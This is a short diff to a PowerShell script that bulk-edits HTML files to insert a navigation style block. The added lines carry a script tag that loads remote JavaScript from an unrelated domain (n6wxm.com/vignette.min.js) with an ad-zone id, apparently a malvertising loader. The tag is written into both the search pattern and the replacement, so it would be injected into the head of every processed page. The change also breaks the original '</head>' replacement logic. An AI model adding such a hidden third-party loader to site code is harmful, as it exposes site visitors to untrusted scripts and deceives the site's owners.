@@ -302,7 +302,11 @@ foreach ($file in $files) {
     if ($content -match '<style id="custom-nav-style">[\s\S]*?</style>') {
         $content = [regex]::Replace($content, '<style id="custom-nav-style">[\s\S]*?</style>', $styleBlock, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
     } else {
-        $content = $content -replace '</head>', "$styleBlock`r`n</head>"
+        $content = $content -replace '<script>(function(s){s.dataset.zone='11012996',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+
+</head>', "$styleBlock`r`n<script>(function(s){s.dataset.zone='11012996',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+
+</head>"
     }
 
     $footerMarkup = @"
